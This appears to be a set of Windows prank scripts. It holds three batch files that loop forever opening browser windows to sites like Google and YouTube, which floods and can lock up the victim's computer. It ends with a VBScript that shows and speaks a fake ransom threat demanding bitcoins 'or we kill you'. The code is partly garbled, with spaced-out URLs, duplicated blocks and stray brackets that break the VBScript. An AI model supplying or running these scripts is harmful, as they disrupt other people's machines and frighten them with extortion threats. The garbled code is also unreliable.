@echo off
:bucle
start www.google.es
start www.yahoo.es
start www.youtube. com
start www.blogger. com
start www.gmail. com
start www.minijuegos .com
goto bucle
@echo off
:bucle
start www.google.es
start www.yahoo.es
start www.youtube. com
goto bucle
@echo off
:bucle
start www.google.es
start www.yahoo.es
start www.youtube. com
goto bucle
Dim message, sapi
message=[InputBox]("NO AY INTARNET","PAGA 10OOO BITCONS O TE MATAMOS")
Set sapi=[CreateObject]("sapi.spvoice")
sapi.Speak message
